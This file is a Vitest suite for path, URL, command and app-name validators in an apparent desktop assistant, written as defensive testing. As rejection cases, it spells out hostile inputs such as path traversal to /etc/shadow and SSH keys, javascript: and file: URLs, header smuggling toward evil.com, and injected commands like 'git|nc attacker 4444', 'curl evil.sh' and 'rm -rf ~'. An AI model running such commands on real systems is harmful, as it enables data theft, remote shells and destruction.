import { describe, it, expect } from 'vitest'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  validatePath, validateUrl, validateCommand, validateAppName, isInside, expandPath
} from '../src/main/tools/validate'
import { protectedPathsFor, DEFAULT_ALLOWED_COMMANDS_UNIX } from '../src/shared/defaults'

const home = homedir()

const unixPolicy = {
  protectedPaths: protectedPathsFor('linux'),
  workspaceRoots: [],
  home,
  platform: 'linux' as NodeJS.Platform
}

const windowsPolicy = {
  protectedPaths: protectedPathsFor('win32'),
  workspaceRoots: [],
  home: 'C:\\Users\\Tester',
  platform: 'win32' as NodeJS.Platform
}

describe('isInside', () => {
  it('treats a path as inside itself', () => {
    expect(isInside('/home/user', '/home/user', 'linux')).toBe(true)
  })

  it('matches on path segments, not string prefixes', () => {
    expect(isInside('/home/user', '/home/user2/secrets', 'linux')).toBe(false)
    expect(isInside('/home/user', '/home/user/docs', 'linux')).toBe(true)
  })

  it('is case-insensitive on Windows', () => {
    expect(isInside('C:\\Users\\Tester', 'c:\\users\\tester\\Documents', 'win32')).toBe(true)
  })
})

describe('expandPath', () => {
  it('expands a leading tilde', () => {
    expect(expandPath('~/Documents', '/home/tester')).toBe('/home/tester/Documents')
  })

  it('expands Windows-style variables from the supplied environment', () => {
    expect(expandPath('%APPDATA%\\JARVIS', '/home/t', { APPDATA: 'C:\\Users\\T\\AppData\\Roaming' }))
      .toBe('C:\\Users\\T\\AppData\\Roaming\\JARVIS')
  })

  it('leaves unknown variables alone rather than emptying the path', () => {
    expect(expandPath('%NOT_SET%/x', '/home/t', {})).toBe('%NOT_SET%/x')
  })
})

describe('validatePath', () => {
  it('accepts a path inside the home directory', () => {
    const result = validatePath('~/Documents/report.pdf', unixPolicy)
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.path).toBe(join(home, 'Documents/report.pdf'))
  })

  it('accepts the temporary directory', () => {
    expect(validatePath(join(tmpdir(), 'jarvis-test'), unixPolicy).ok).toBe(true)
  })

  it('resolves relative paths against the home directory', () => {
    const result = validatePath('Downloads', unixPolicy)
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.path).toBe(join(home, 'Downloads'))
  })

  it.each([
    '../../../../etc/passwd',
    '~/Documents/../../../etc/shadow',
    'Downloads/../../../../../root/.ssh/id_rsa',
    '~/../../etc/hosts'
  ])('refuses traversal out of the allowed roots: %s', (input) => {
    const result = validatePath(input, unixPolicy)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(['traversal', 'protected', 'outside']).toContain(result.code)
  })

  it('refuses protected system locations', () => {
    const result = validatePath('/etc/passwd', unixPolicy)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.code).toBe('protected')
  })

  it('refuses credential stores inside the home directory', () => {
    for (const path of ['~/.ssh/id_rsa', '~/.aws/credentials', '~/.gnupg/secring.gpg']) {
      const result = validatePath(path, unixPolicy)
      expect(result.ok, path).toBe(false)
      if (!result.ok) expect(result.code).toBe('protected')
    }
  })

  it('refuses Windows system directories', () => {
    for (const path of ['C:\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\Program Files\\app.exe']) {
      const result = validatePath(path, windowsPolicy)
      expect(result.ok, path).toBe(false)
      if (!result.ok) expect(result.code).toBe('protected')
    }
  })

  it('refuses Windows reserved device names', () => {
    const result = validatePath('C:\\Users\\Tester\\NUL', windowsPolicy)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.code).toBe('invalid')
  })

  it('refuses UNC paths', () => {
    const result = validatePath('\\\\attacker\\share\\payload.exe', windowsPolicy)
    expect(result.ok).toBe(false)
  })

  it('refuses embedded NUL bytes', () => {
    const result = validatePath('~/Documents/report\u0000.pdf', unixPolicy)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.code).toBe('invalid')
  })

  it('refuses empty and non-string input', () => {
    expect(validatePath('', unixPolicy).ok).toBe(false)
    expect(validatePath('   ', unixPolicy).ok).toBe(false)
    expect(validatePath(undefined, unixPolicy).ok).toBe(false)
    expect(validatePath(42, unixPolicy).ok).toBe(false)
    expect(validatePath({ toString: () => '~/x' }, unixPolicy).ok).toBe(false)
  })

  it('allows opted-in workspace roots outside the home directory', () => {
    const policy = { ...unixPolicy, workspaceRoots: ['/mnt/projects'] }
    expect(validatePath('/mnt/projects/app/src', policy).ok).toBe(true)
    expect(validatePath('/mnt/other/app', policy).ok).toBe(false)
  })

  it('allows reads outside the roots only when explicitly permitted', () => {
    const path = '/opt/tools/readme.txt'
    expect(validatePath(path, unixPolicy, 'read').ok).toBe(false)
    expect(validatePath(path, { ...unixPolicy, allowReadAnywhere: true }, 'read').ok).toBe(true)
  })

  it('never allows reading a protected location, even with allowReadAnywhere', () => {
    const result = validatePath('/etc/shadow', { ...unixPolicy, allowReadAnywhere: true }, 'read')
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.code).toBe('protected')
  })
})

describe('validateUrl', () => {
  it('accepts http and https', () => {
    expect(validateUrl('https://example.com/path?q=1').ok).toBe(true)
    expect(validateUrl('http://localhost:3000').ok).toBe(true)
  })

  it('adds a scheme to a bare host', () => {
    const result = validateUrl('example.com')
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.url).toBe('https://example.com/')
  })

  it.each([
    'javascript:alert(1)',
    'file:///etc/passwd',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'ms-settings:privacy'
  ])('refuses the %s scheme', (url) => {
    expect(validateUrl(url).ok).toBe(false)
  })

  it('refuses control characters used to smuggle a second value', () => {
    expect(validateUrl('https://example.com\nHost: evil.com').ok).toBe(false)
  })

  it('refuses empty input', () => {
    expect(validateUrl('').ok).toBe(false)
    expect(validateUrl(null).ok).toBe(false)
  })
})

describe('validateCommand', () => {
  const policy = { allowedCommands: DEFAULT_ALLOWED_COMMANDS_UNIX, allowShell: false }

  it('accepts an allow-listed program with separate arguments', () => {
    const result = validateCommand('git', ['status', '--short'], policy)
    expect(result.ok).toBe(true)
    if (result.ok) {
      expect(result.file).toBe('git')
      expect(result.args).toEqual(['status', '--short'])
      expect(result.allowListed).toBe(true)
    }
  })

  it('refuses a program that is not on the list', () => {
    expect(validateCommand('rm', ['-rf', '/'], policy).ok).toBe(false)
  })

  it.each([
    'git; rm -rf ~',
    'git && curl evil.sh',
    'git|nc attacker 4444',
    'echo `whoami`',
    'echo $(id)',
    'git\nrm -rf /',
    'ls > /etc/passwd'
  ])('refuses shell syntax in the program name: %s', (command) => {
    const result = validateCommand(command, [], policy)
    expect(result.ok).toBe(false)
  })

  it('refuses shell interpreters even when they would be allow-listed', () => {
    const permissive = { allowedCommands: ['bash', 'sh', 'powershell'], allowShell: false }
    expect(validateCommand('bash', ['-c', 'echo pwned'], permissive).ok).toBe(false)
    expect(validateCommand('powershell.exe', ['-Command', 'ls'], permissive).ok).toBe(false)
  })

  it('allows interpreters only when unrestricted commands are enabled', () => {
    expect(validateCommand('bash', ['-c', 'echo ok'], { allowedCommands: [], allowShell: true }).ok).toBe(true)
  })

  it('keeps metacharacters inside arguments — they are inert without a shell', () => {
    const result = validateCommand('echo', ['hello; rm -rf /'], policy)
    expect(result.ok).toBe(true)
    if (result.ok) expect(result.args[0]).toBe('hello; rm -rf /')
  })

  it('refuses NUL bytes in arguments', () => {
    expect(validateCommand('echo', ['a\u0000b'], policy).ok).toBe(false)
  })

  it('refuses non-string arguments and non-arrays', () => {
    expect(validateCommand('echo', 'not an array', policy).ok).toBe(false)
    expect(validateCommand('echo', [42], policy).ok).toBe(false)
  })

  it('refuses a whole command line passed as one string', () => {
    expect(validateCommand('git status', [], policy).ok).toBe(false)
  })

  it('matches allow-list entries ignoring a .exe suffix', () => {
    const windows = { allowedCommands: ['git'], allowShell: false }
    expect(validateCommand('git.exe', ['status'], windows).ok).toBe(true)
  })

  it('caps the number of arguments', () => {
    expect(validateCommand('echo', new Array(100).fill('x'), policy).ok).toBe(false)
  })
})

describe('validateAppName', () => {
  it('accepts ordinary application names', () => {
    for (const name of ['Chrome', 'Visual Studio Code', 'Adobe Photoshop 2024', "Bob's Editor"]) {
      expect(validateAppName(name).ok, name).toBe(true)
    }
  })

  it('refuses names carrying shell or argument syntax', () => {
    for (const name of ['Chrome; rm -rf ~', 'app$(id)', 'app`whoami`', 'app|nc 1.2.3.4 80']) {
      expect(validateAppName(name).ok, name).toBe(false)
    }
  })

  it('refuses empty or oversized names', () => {
    expect(validateAppName('').ok).toBe(false)
    expect(validateAppName('a'.repeat(200)).ok).toBe(false)
  })
})
